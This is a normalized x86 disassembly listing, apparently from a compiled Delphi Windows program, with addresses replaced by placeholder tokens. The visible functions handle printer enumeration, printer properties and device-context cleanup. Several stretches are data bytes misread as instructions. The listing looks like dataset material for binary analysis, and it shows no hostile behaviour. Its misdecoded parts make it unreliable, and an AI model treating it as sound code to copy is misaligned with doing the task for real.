call sub_4030f4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4266d1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42673d
lea eax [ ebp - 0x10 ]
call sub_403ef8
retn
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_4254bc
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_4038b0
mov eax esi
xor edx edx
call sub_4254bc
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
jle r-xdata
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_4254bc
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov edx [ ebp - 0x10 ]
mov ecx esi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403124
retn
mov eax [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_4254bc
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
sub_426744
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_426829
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test esi esi
je r-xdata
mov eax [ edi + 0x18 ]
mov eax [ eax + 0x8 ]
test eax eax
jle r-xdata
lea eax [ edi + 0x24 ]
mov edx esi
call sub_403f4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426830
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404980
lea eax [ ebp - 0x8 ]
call sub_405598
retn
dec eax
jne r-xdata
xor edx edx
mov eax [ edi + 0x18 ]
call sub_4254bc
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4055b0
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4055dc
mov eax [ ebp - 0x10 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
xor edx edx
mov eax [ edi + 0x18 ]
call sub_4254bc
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4055b0
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4055dc
mov eax [ ebp - 0xc ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
jmp r-xdata
sub_426a60
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_426b53
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx [ ebp - 0x8 ]
call sub_403f4c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_4038b0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426b5a
lea eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404980
lea eax [ ebp - 0x10 ]
call sub_405598
retn
inc ebx
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec ebx
jne r-xdata
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_4055dc
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ esi + 0x14 ]
call sub_4254bc
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x10 ]
call sub_4055b0
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_4055dc
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x38 ]
test al al
je r-xdata
sub_426b78
inc ebx
mov eax eax
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_426c57
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_403f4c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_4038b0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426c5e
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404980
lea eax [ ebp - 0x8 ]
call sub_405598
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4055dc
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_4254bc
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4055b0
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4055dc
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_426c78
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_40560c
xor eax eax
push ebp
push sub_426cc7
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
call sub_4055b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426cce
lea eax [ ebx + 0xc ]
call sub_405598
sub_426cd4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4043a8
xor eax eax
push ebp
push sub_426d69
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
dec ax
je r-xdata
lea eax [ ebx + 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_403f4c
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_426a60
jmp r-xdata
dec ax
je r-xdata
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426d70
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
mov eax ebx
call sub_426574
jmp r-xdata
dec ax
je r-xdata
mov eax ebx
call sub_4265a4
jmp r-xdata
jmp r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_426744
sub_426d94
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_4254bc
cmp edi [ eax + 0x8 ]
jne r-xdata
mov eax [ esi + 0x18 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_4254bc
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_413ff8
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_4254bc
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_413ff8
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_413ff8
sub_426e20
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov eax esi
call sub_426534
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x18 ]
call sub_403124
mov eax [ esi + 0x14 ]
call sub_403124
mov eax [ esi + 0x10 ]
call sub_403124
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403114
test bl bl
jle r-xdata
lea eax [ esi + 0xc ]
call sub_405598
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_426e74
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426eab
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426eb2
retn
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
sub_426edc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426f01
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426f08
retn
sub_426f18
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
outsd
inc edx
add [ eax + eax ] cl
add [ eax ] al
int3
sub_42701c
push esi
mov esi [ eax ]
cmp [ eax ] 0x0
je r-xdata
mov eax esi
pop esi
retn
mov edx [ eax ]
jmp r-xdata
cmp [ edx ] 0x20
je r-xdata
inc edx
mov esi edx
jmp r-xdata
mov cl [ edx ]
test cl cl
je r-xdata
cmp [ edx ] 0x2c
jne r-xdata
cmp cl 0x2c
jne r-xdata
mov [ eax ] edx
mov [ edx ] 0x0
inc edx
inc edx
sub_42706c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0x70
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh dl
jo r-xdata
add [ eax + edx + 0xc0040 ] ch
add [ eax ] dl
add [ eax ] al
add [ eax + 0x6c004010 ] bh
xor eax [ eax ]
js r-xdata
retn 0x8
outsb
je r-xdata
add [ eax ] al
push cs
push esp
push eax
jb r-xdata
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] ch
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
or [ eax ] al
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
or al 0x0
pop ebp
jb r-xdata
call sub_4040f0
mov eax edi
test bl bl
je r-xdata
jbe r-xdata
mov eax edi
pop edi
pop esi
pop ebx
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
add [ edx ] ch
push ebx
push esi
mov esi ecx
mov ebx eax
xor eax eax
push ebp
push sub_4271bb
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_4040f0
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x8 ]
call sub_404304
jne r-xdata
arpl [ ebp - 0x73 ] sp
inc eax
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
test dl dl
je r-xdata
xor eax eax
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030f4
lea eax [ edi + 0x4 ]
mov edx esi
call sub_4040f0
lea eax [ edi + 0x8 ]
mov edx [ ebp + 0xc ]
call sub_4040f0
lea eax [ edi + 0xc ]
mov edx [ ebp + 0x8 ]
add esp 0xfffffff0
call sub_403448
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4271c2
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f1c
retn
mov al 0x1
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_4040f0
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0xc ]
call sub_404304
je r-xdata
sub_4270e8
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030f4
lea eax [ edi + 0x4 ]
mov edx esi
call sub_4040f0
lea eax [ edi + 0x8 ]
mov edx [ ebp + 0xc ]
call sub_4040f0
lea eax [ edi + 0xc ]
mov edx [ ebp + 0x8 ]
call sub_4040f0
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_427148
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov ebx eax
xor eax eax
push ebp
push sub_4271bb
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_4040f0
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x8 ]
call sub_404304
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4271c2
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f1c
retn
mov al 0x1
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_4040f0
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0xc ]
call sub_404304
je r-xdata
sub_4271cc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030f4
mov [ esi + 0x14 ] 0xffffffff
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax esi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_427208
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
cmp [ esi + 0x1c ] 0x0
je r-xdata
xor edx edx
mov eax esi
call sub_427284
mov eax esi
call sub_427c78
mov eax esi
call sub_427cb4
mov eax [ esi + 0x4 ]
call sub_403124
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
mov eax esi
call sub_427420
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
push eax
call ClosePrinter
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403114
test bl bl
jle r-xdata
push eax
call GlobalUnlock
mov eax [ esi + 0x28 ]
push eax
call GlobalFree
xor eax eax
mov [ esi + 0x28 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_427284
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4273a2
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ esi + 0x1f ]
cmp bl al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4273a9
lea eax [ ebp - 0x8 ]
call sub_403ef8
retn
xor edi edi
mov edx ebx
sub dl 0x1
jb r-xdata
xor edx edx
mov eax esi
call sub_4273b0
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
je r-xdata
mov eax [ esi + 0x20 ]
push eax
call DeleteDC
xor eax eax
mov [ esi + 0x20 ] eax
jmp r-xdata
xor edx edx
call sub_41ee14
cmp al 0x2
je r-xdata
dec dl
je r-xdata
test edi edi
je r-xdata
mov edi r-xdata
jmp r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
jmp r-xdata
mov [ esi + 0x1f ] bl
mov eax esi
call sub_427820
push eax
mov eax esi
call sub_427838
pop edx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
call sub_4043b8
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_4043b8
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4043b8
push eax
call edi
mov [ esi + 0x20 ] eax
cmp [ esi + 0x20 ] 0x0
jne r-xdata
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
xor edx edx
call sub_41ee14
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405a5c
mov eax [ ebp - 0x8 ]
call sub_427050
mov edi r-xdata
push eax
call DeleteDC
mov edx [ esi + 0x20 ]
call sub_41ee14
sub_4273b0
push ebp
mov ebp esp
push 0x0
push 0x0
xor ecx ecx
push ebp
push sub_427415
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp dl [ eax + 0x1c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42741c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f1c
retn
test dl dl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405a5c
mov eax [ ebp - 0x8 ]
call sub_427050
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
mov eax [ ebp - 0x4 ]
call sub_427050
jmp r-xdata
sub_427420
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_4273b0
mov eax [ ebx + 0x20 ]
push eax
call EndPage
cmp [ ebx + 0x1d ] 0x0
jne r-xdata
mov [ ebx + 0x1c ] 0x0
mov [ ebx + 0x1d ] 0x0
xor eax eax
mov [ ebx + 0xc ] eax
pop ebx
retn
mov eax [ ebx + 0x20 ]
push eax
call EndDoc
sub_427454
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_427820
push eax
mov eax ebx
call sub_427838
pop edx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
mov eax [ esi + 0x8 ]
call sub_4043b8
mov edx eax
mov eax edi
call sub_40865c
mov eax [ esi + 0x4 ]
call sub_4043b8
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_40865c
mov eax [ esi + 0xc ]
call sub_4043b8
mov edx eax
mov eax [ ebp + 0xc ]
call sub_40865c
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x28 ]
mov [ eax ] edx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_4274c0
push ebx
push esi
mov esi edx
mov ebx eax
mov al [ r-xdata ]
mov [ ebx + 0x1e ] al
test esi 0x1
je r-xdata
test esi 0x100
je r-xdata
or [ ebx + 0x1e ] 0x2
test esi 0x8000
je r-xdata
or [ ebx + 0x1e ] 0x1
pop esi
pop ebx
retn
or [ ebx + 0x1e ] 0x4
sub_4274fc
push ebp
mov ebp esp
add esp 0xffffff3c
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xb0 ] ebx
mov [ ebp - 0xb4 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_427733
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_4273b0
mov eax [ ebx + 0x28 ]
cmp esi eax
je r-xdata
mov esi [ ebx + 0x28 ]
test esi esi
je r-xdata
test eax eax
je r-xdata
mov eax ebx
call sub_427cb4
mov eax [ ebx + 0x2c ]
test eax eax
je r-xdata
push esi
call GlobalLock
mov edi eax
mov [ ebx + 0x24 ] edi
mov edx [ edi + 0x28 ]
mov eax ebx
call sub_4274c0
mov [ ebx + 0x28 ] esi
push eax
call GlobalUnlock
mov eax [ ebx + 0x28 ]
push eax
call GlobalFree
xor edx edx
mov eax ebx
call sub_427284
mov [ ebp - 0xc ] 0xffffffff
mov eax ebx
call sub_427838
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
push eax
call ClosePrinter
xor eax eax
mov [ ebx + 0x2c ] eax
cmp [ ebp - 0xc ] 0xffffffff
jne r-xdata
inc edi
xor esi esi
mov eax [ ebp - 0xc ]
mov [ ebx + 0x14 ] eax
push 0x0
lea eax [ ebx + 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call OpenPrinterA
test eax eax
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4270e8
push eax
lea eax [ ebp - 0xb0 ]
push eax
lea edx [ ebp - 0xb4 ]
mov eax [ rw-data ]
call sub_405a5c
mov eax [ ebp - 0xb4 ]
mov edx [ ebp - 0x4 ]
mov [ ebp - 0xc4 ] edx
mov [ ebp - 0xc0 ] 0x6
mov edx [ ebp + 0xc ]
mov [ ebp - 0xbc ] edx
mov [ ebp - 0xb8 ] 0x6
lea edx [ ebp - 0xc4 ]
mov ecx 0x1
call sub_408d28
mov edx [ ebp - 0xb0 ]
mov eax [ ebx + 0x10 ]
pop ecx
mov esi [ eax ]
call [ esi + 0x3c ]
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0xc
mov edx [ ebp + 0xc ]
call sub_4040f0
mov [ ebp - 0xc ] esi
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42773a
lea eax [ ebp - 0xb4 ]
mov edx 0x2
call sub_403f1c
retn
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov edx esi
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_427148
test al al
je r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0xac ]
push eax
lea eax [ ebp - 0xac ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
push 0x0
call DocumentPropertiesA
push eax
push 0x42
call GlobalAlloc
mov esi eax
mov [ ebx + 0x28 ] esi
test esi esi
je r-xdata
mov eax [ ebx + 0x24 ]
mov edx [ eax + 0x28 ]
mov eax ebx
call sub_4274c0
push esi
call GlobalLock
mov edi eax
mov [ ebx + 0x24 ] edi
push 0x2
push edi
push edi
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
push 0x0
call DocumentPropertiesA
test eax eax
jge r-xdata
mov eax [ ebx + 0x28 ]
push eax
call GlobalUnlock
mov eax [ ebx + 0x28 ]
push eax
call GlobalFree
xor eax eax
mov [ ebx + 0x28 ] eax
sub_427744
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_42779b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_427820
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x24 ]
movsx eax [ eax + 0x36 ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4277a2
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
mov eax [ ebp - 0x4 ]
call sub_427050
sub_4277a8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_427812
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_4273b0
mov eax ebx
call sub_427820
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
xor edx edx
mov eax ebx
call sub_427284
mov eax [ ebx + 0x24 ]
mov [ eax + 0x36 ] si
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427819
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
mov eax [ ebp - 0x4 ]
call sub_427050
sub_427838
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_427a67
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] ebx
mov edi ebx
xor edx edx
push ebp
push sub_427a24
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov esi 0x2
mov bl 0x5
mov esi 0x6
mov bl 0x4
jmp r-xdata
mov eax [ ebp - 0x14 ]
call sub_4026e4
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_427a13
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0xc ]
push eax
xor eax eax
mov al bl
push eax
push 0x0
push esi
call EnumPrintersA
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x0
xor eax eax
mov al bl
push eax
push 0x0
push esi
call EnumPrintersA
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x18 ]
dec eax
test eax eax
jl r-xdata
call sub_40395c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427a6e
lea eax [ ebp - 0x28 ]
mov edx 0x3
call sub_403f1c
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_402704
retn
inc eax
mov [ ebp - 0x1c ] eax
